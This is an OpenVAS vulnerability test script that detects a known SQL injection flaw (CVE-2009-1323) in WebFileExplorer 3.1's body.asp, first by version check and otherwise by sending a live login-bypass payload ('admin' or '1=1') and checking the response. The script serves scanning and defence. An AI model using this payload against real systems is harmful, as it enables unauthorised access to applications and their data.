###############################################################################
# OpenVAS Vulnerability Test
# $Id: webfileexplorer_34462.nasl 13903 2019-02-27 10:44:02Z cfischer $
#
# WebFileExplorer 'body.asp' SQL Injection Vulnerability
#
# Authors
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:webfileexplorer:web_file_explorer";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100137");
  script_version("$Revision: 13903 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-27 11:44:02 +0100 (Wed, 27 Feb 2019) $");
  script_tag(name:"creation_date", value:"2009-04-16 19:20:22 +0200 (Thu, 16 Apr 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-1323");
  script_bugtraq_id(34462);
  script_name("WebFileExplorer 'body.asp' SQL Injection Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("webfileexplorer_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("webfileexplorer/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34462");

  script_tag(name:"summary", value:"WebFileExplorer is prone to an SQL-injection vulnerability because
  it fails to sufficiently sanitize user-supplied data before using it in an SQL query.");

  script_tag(name:"affected", value:"WebFileExplorer 3.1 is vulnerable. Other versions may also be
  affected.");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent vulnerabilities in the underlying database.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("version_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:FALSE ) )
  exit( 0 );

vers = infos['version'];
dir = infos['location'];

if( vers && vers != "unknown" ) {
  if( version_is_equal( version:vers, test_version:"3.1" ) ) {
    report = report_fixed_ver( installed_version:vers, fixed_version:"None", install_path:dir );
    security_message( port:port, data:report );
    exit( 0 );
  }
  exit( 99 );
} else {

  if( ! dir )
    exit( 0 );

  # No version found, try to exploit.
  if( dir == "/" )
    dir = "";

  variables = string("login_name=&dologin=yes&id=admin%27+or+%271%3D1&pwd=xxx&B1=Login");
  filename = string( dir + "/body.asp" );
  host = http_host_name( port:port );

  req = string( "POST ", filename, " HTTP/1.1\r\n",
                "Referer: http://", host, filename, "\r\n",
                "Host: ", host, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(variables),
                "\r\n\r\n",
                variables );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
  if(res && egrep( pattern:"Number of entries per page", string:res ) ) {
    report = report_vuln_url( port:port, url:filename );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );